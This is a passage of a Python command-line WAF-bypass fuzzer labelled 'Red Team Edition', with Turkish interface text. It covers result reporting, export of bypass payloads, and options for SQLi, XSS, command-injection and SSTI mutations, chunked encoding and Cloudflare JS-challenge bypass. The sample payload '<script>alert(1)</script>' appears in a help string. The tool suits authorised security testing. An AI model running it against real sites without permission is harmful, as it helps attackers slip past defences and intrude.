        bypasses = [r for r in self.results if r.bypass]
        errors   = [r for r in self.results if r.status in [0, -1]]

        console.print()
        console.print(Panel(
            f"Toplam mutation: [primary]{len(self.results)}[/primary] | "
            f"Bypass: [success]{len(bypasses)}[/success] | "
            f"Error/Timeout: [danger]{len(errors)}[/danger]",
            title="[primary]Sonuç Özeti[/primary]", border_style="secondary"
        ))

        if not bypasses:
            console.print("[success]✔ Hiçbir payload WAF'ı bypass edemedi.[/success]")
            return

        console.print(f"\n[warning]⚠ {len(bypasses)} başarılı bypass tespit edildi![/warning]\n")

        table = Table(show_header=True, header_style="primary",
                      border_style="secondary", box=box.ROUNDED)
        table.add_column("HTTP", width=6, justify="center")
        table.add_column("Bytes", width=8, justify="right")
        table.add_column("Conf%", width=7, justify="center")
        table.add_column("Signals", width=9, justify="center")
        table.add_column("Payload", min_width=40)
        table.add_column("Reasons")

        for r in sorted(bypasses, key=lambda x: x.confidence, reverse=True):
            table.add_row(
                str(r.status),
                str(r.length),
                f"{r.confidence}%",
                r.signals,
                r.payload[:80],
                ", ".join(r.reasons[:2]),
            )

        console.print(table)

    def export_json(self, path: str):
        bypasses = [
            {
                "payload":    r.payload,
                "status":     r.status,
                "length":     r.length,
                "confidence": r.confidence,
                "signals":    r.signals,
                "reasons":    r.reasons,
            }
            for r in self.results if r.bypass
        ]
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"waf_detected": [n for n, _ in self.waf_names],
                       "total_mutations": len(self.results),
                       "bypasses": bypasses}, f, indent=2, ensure_ascii=False)
        console.print(f"\n[success]✔[/success] {len(bypasses)} bypass → {path}")

    def export_txt(self, path: str):
        bypasses = [r for r in self.results if r.bypass]
        with open(path, "w", encoding="utf-8") as f:
            for r in bypasses:
                f.write(r.payload + "\n")
        console.print(f"[success]✔[/success] Payload listesi → {path}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
BANNER = r"""[primary]
 __      __   _   _____   ___                      
 \ \    / /  /_\ | __\ \ / / |_ _ __ __ _ _______ _ 
  \ \/\/ /  / _ \| _| \ V /| | | '_ \ _` |_ / _` | ' \
   \_/\_/  /_/ \_\_|   \_/ |_|_|_.__/\__,_/__\__,_|_||_|
[/primary][secondary]  Red Team Edition v2.0 — Yalnızca yetkili ortamlarda kullanın.
  GitHub: https://github.com/pavlushkax[/secondary]
"""

async def main():
    parser = argparse.ArgumentParser(
        description="WAF Fuzzer v2 — Red Team Edition",
        epilog="Yalnızca yetkili/izinli lab ortamlarında kullanılmalıdır.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # Hedef
    parser.add_argument("-u", "--url", required=True,
                        help="Hedef URL. 'FUZZ' ile enjeksiyon noktası belirlenir.")

    # Payload
    pg = parser.add_mutually_exclusive_group(required=True)
    pg.add_argument("-p", "--payload",
                    help="Tek baseline payload (ör: '<script>alert(1)</script>')")
    pg.add_argument("-w", "--wordlist",
                    help="Payload wordlist dosyası (.txt, satır başı yorum için #)")

    # HTTP ayarları
    parser.add_argument("-X", "--method", default="GET",
                        help="HTTP metodu (varsayılan: GET)")
    parser.add_argument("-d", "--data",
                        help="POST/PUT body. 'FUZZ' ile enjeksiyon noktası belirlenir.")
    parser.add_argument("-H", "--header", action="append",
                        help="Header (tekrarlanabilir): 'Authorization: Bearer TOKEN'")
    parser.add_argument("-c", "--cookies",
                        help="Cookie string: 'session=abc; token=xyz'")
    parser.add_argument("--proxy",
                        help="Proxy URL: http://127.0.0.1:8080 (Burp Suite için)")

    # Mutation
    parser.add_argument("--context",
                        choices=["general", "sqli", "xss", "cmdi", "path", "ssti"],
                        default="general",
                        help="Mutation context (varsayılan: general)")
    parser.add_argument("--no-mutate", action="store_true",
                        help="Mutation engine'i devre dışı bırak (payload'ları olduğu gibi gönder)")

    # Performans
    parser.add_argument("--concurrency", type=int, default=30,
                        help="Eşzamanlı istek sayısı (varsayılan: 30)")
    parser.add_argument("--rate-limit", type=float, default=0.0,
                        help="İstekler arası bekleme süresi saniye (varsayılan: 0)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="İstek timeout süresi saniye (varsayılan: 10)")
    parser.add_argument("--chunked", action="store_true",
                        help="Chunked transfer encoding kullan (POST/PUT)")

    # JS Challenge
    parser.add_argument("--js-challenge", action="store_true",
                        help="Playwright ile JS challenge bypass dene (Cloudflare vb.)")

    # Çıktı
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Tüm sonuçları (bloklar dahil) göster")
    parser.add_argument("-o", "--output",
                        help="JSON rapor çıktı dosyası")
    parser.add_argument("--output-payloads",
                        help="Başarılı bypass payload'larını .txt olarak kaydet")
    parser.add_argument("--force", action="store_true",
                        help="Baseline başarısız olsa bile devam et (false positive riski!)")
    parser.add_argument("--benign", default="safe_string_test_123",
                        help="Benign baseline string (varsayılan: safe_string_test_123)")

    args = parser.parse_args()

    console.print(BANNER)

    # --- Header parse ---
    headers = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip().title()] = v.strip()

    # --- Cookie parse ---
    cookies = {}
    if args.cookies:
        for part in args.cookies.split(";"):
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k.strip()] = v.strip()

    # --- Payload yükle ---
    base_payloads = []
    if args.payload:
        base_payloads.append(args.payload)
    else:
        if not os.path.exists(args.wordlist):
            console.print(f"[danger]Wordlist bulunamadı: {args.wordlist}[/danger]")
            sys.exit(1)
        with open(args.wordlist, encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    base_payloads.append(line)
                    if args.wordlist and not args.no_mutate:
                        args.no_mutate = True
                        print("[!] Wordlist modu: mutation otomatik kapatıldı.")

    if not base_payloads:
        console.print("[danger]Hiç payload yüklenmedi![/danger]")
        sys.exit(1)

    console.print(f"[info]Yüklenen payload sayısı: {len(base_payloads)}[/info]")

    # --- Fuzzer init ---
    fuzzer = WAFFuzzer(
        url=args.url, method=args.method, data=args.data,
        headers=headers, cookies=cookies, proxy=args.proxy,
        rate_limit=args.rate_limit, timeout=args.timeout,
        verbose=args.verbose, chunked=args.chunked,
        concurrency=args.concurrency, js_challenge=args.js_challenge,
    )

    # --- Baseline ---
    baseline_ok = await fuzzer.run_baseline(
        benign_str=args.benign,
        malicious_payload=base_payloads[0],
    )
    if not baseline_ok and not args.force:
        console.print("[warning]Baseline başarısız. --force ile zorlamak için tekrar çalıştırın.[/warning]")
        sys.exit(1)
    elif not baseline_ok:
        console.print("[warning]--force: Baseline hatası görmezden gelinecek.[/warning]")
        # Dummy profiller
        from dataclasses import dataclass
        fuzzer.benign_profile  = BaselineProfile(200, 100, "", "")
        fuzzer.blocked_profile = BaselineProfile(403, 500, "", "access denied")

    # --- Mutation ---
    if args.no_mutate:
        all_mutations = base_payloads
        console.print(f"[muted]Mutation devre dışı. {len(all_mutations)} payload doğrudan gönderilecek.[/muted]")
    else:
        console.print(f"\n[primary]── Mutation Engine ({args.context}) ─────────────────────[/primary]")
        all_mutations_set: set[str] = set()
        for bp in base_payloads:
            variants = MutationEngine.generate(bp, context=args.context)
            all_mutations_set.update(variants)
        all_mutations = list(all_mutations_set)
        console.print(f"[info]{len(base_payloads)} payload → {len(all_mutations)} mutation üretildi[/info]")

    # --- Fuzz ---
    t0 = time.monotonic()
    await fuzzer.fuzz(all_mutations)
    elapsed = time.monotonic() - t0
    console.print(f"\n[muted]Süre: {elapsed:.1f}s | {len(all_mutations)/max(elapsed,0.1):.0f} req/s[/muted]")

    # --- Rapor ---
    fuzzer.display_report()

    # --- Export ---
    if args.output:
        fuzzer.export_json(args.output)
    if args.output_payloads:
        fuzzer.export_txt(args.output_payloads)


if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[danger]Kullanıcı tarafından durduruldu.[/danger]")
        sys.exit(0)
